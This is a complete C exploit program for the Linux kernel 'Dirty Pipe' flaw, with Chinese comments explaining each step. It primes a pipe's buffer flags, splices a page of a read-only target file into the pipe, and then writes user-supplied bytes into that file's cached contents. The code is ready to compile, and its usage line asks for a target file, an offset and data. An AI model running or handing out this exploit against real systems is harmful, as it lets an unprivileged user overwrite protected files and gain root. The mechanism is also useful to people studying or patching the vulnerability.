#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/user.h>

//用于报错
void errExit(char * msg)
{
    printf("\033[31m\033[1m[x] Error : \033[0m%s\n", msg);
    exit(EXIT_FAILURE);
}

int main(int argc, char **argv, char **envp)
{
    long            page_size;
    size_t          offset_in_file;
    size_t          data_size;
    int             target_file_fd;
    int             pipe_fd[2];
    int             pipe_size;
    char            *buffer;
    int             retval;

    if (argc < 4)
    {
        puts("[*] Usage: ./exp target_file offset_in_file data");
        exit(EXIT_FAILURE);
    }
    //页的大小，4096字节
    page_size = sysconf(_SC_PAGE_SIZE);
    //从第几字节开始修改文件. offset_in_file 需要大于1
    offset_in_file = strtoul(argv[2], NULL, 0);
    if (offset_in_file % page_size == 0)
        errExit("Cannot write on the boundary of a page!");
    //目标文件，需要可读
    target_file_fd = open(argv[1], O_RDONLY);
    if (target_file_fd < 0)
        errExit("Failed to open the target file!");


    //写入数据的大小，需要不超出页或原文件的大小
    data_size = strlen(argv[3]);

    if (((offset_in_file % page_size) + data_size) > page_size)
        errExit("Cannot write accross a page!");



    pipe(pipe_fd);
    pipe_size = fcntl(pipe_fd[1], F_GETPIPE_SZ);
    buffer = (char*) malloc(page_size);

    // 灌满管道，为每个 buffer 分配新的页框，并都设置上PIPE_BUF_FLAG_CAN_MERGE标志
    for (int size_left = pipe_size; size_left > 0; )
    {
        int per_write = size_left > page_size ? page_size : size_left;
        size_left -= write(pipe_fd[1], buffer, per_write);
    }
    //从管道读出数据，释放buffer ，但PIPE_BUF_FLAG_CAN_MERGE标志仍保留，故对应的页将可被再次使用
    for (int size_left = pipe_size; size_left > 0; )
    {
        int per_read = size_left > page_size ? page_size : size_left;
        size_left -= read(pipe_fd[0], buffer, per_read);
    }


    //使用 splice 系统调用将数据从目标文件中读入到管道，（从offset_in_file - 1 开始，读入1个字节，）从而让 pipe_buffer->page 变为文件在内存中映射的页面
    //offset_in_file 需要减1 因为此处必须读至少1个字节 之后的空间才可被覆盖
    offset_in_file--;
    retval = splice(target_file_fd, &offset_in_file, pipe_fd[1], NULL, 1, 0);
    if (retval < 0)
        errExit("splice failed!");
    else if (retval == 0)
        errExit("short splice!");

    //由于漏洞的存在， PIPE_BUF_FLAG_CAN_MERGE 标志仍保留着
    //一切就绪。此时向管道中写入数据，管道计数器会发现上一个 pipe_buffer 没有写满，且也有设置PIPE_BUF_FLAG_CAN_MERGE标志位，于是会写入到那个页缓存中
    retval = write(pipe_fd[1], argv[3], data_size);
    if (retval < 0)
        errExit("Write failed!");
    else if (retval < data_size)
        errExit("Short write!");

    puts("done");
}
